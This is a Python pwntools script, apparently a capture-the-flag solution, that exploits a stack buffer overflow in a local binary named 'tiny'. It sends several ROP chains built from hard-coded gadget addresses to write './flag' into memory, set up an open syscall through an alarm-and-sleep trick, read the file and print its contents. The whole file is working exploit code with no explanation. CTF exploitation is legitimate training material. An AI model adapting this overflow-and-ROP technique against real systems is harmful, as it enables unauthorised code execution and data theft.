from pwn import *
from ctypes import *
context.log_level = 'debug'
#context(os='linux',arch='amd64',endian='little')
sh = process('./tiny')
sh.recvuntil('pwn')


bss =  0x602000-0x100
v = 0x4004f6
a = 0x400497
r = 0x4004ae
w = 0x4004d2
syscall = 0x4004f1
pop_rdi = 0x4005d3
pop_rsi_r15 = 0x4005d1
mov_rax_pop = 0x400561

payload = 'a'*0x28
payload += p64(pop_rdi) + p64(bss) + p64(pop_rsi_r15) + p64(8) + p64(0) + p64(r) + p64(v)
sh.send(payload)
sh.recvuntil('Bye')
sh.send('./flag\x00')


payload = 'a'*0x28
payload += p64(pop_rdi) + p64(bss-0x20) + p64(pop_rsi_r15) + p64(8) + p64(0) + p64(r) + p64(v)
sh.send(payload)
sh.recvuntil('Bye')
sh.send(p64(syscall))

sleep(0x14)
payload = 'a'*0x28
payload += p64(a) + p64(pop_rdi) + p64(bss) + p64(pop_rsi_r15) + p64(0)*2 + p64(syscall) + p64(v)*2
#gdb.attach(sh,'b *0x4004ab')
sh.send(payload)
sh.recvuntil('Bye')

payload = 'a'*0x28
payload += p64(mov_rax_pop) + p64(1) + p64(0x4005cc) + p64(bss-0x20) + p64(3) + p64(bss+0x20) + p64(0x20) + p64(0x4005b0) + p64(v)
sh.send(payload)
sh.recvuntil('Bye')

payload = 'a'*0x28
payload += p64(pop_rdi) + p64(bss+0x20) + p64(pop_rsi_r15) + p64(0x20) + p64(0) + p64(w)
sh.send(payload)

sh.interactive()








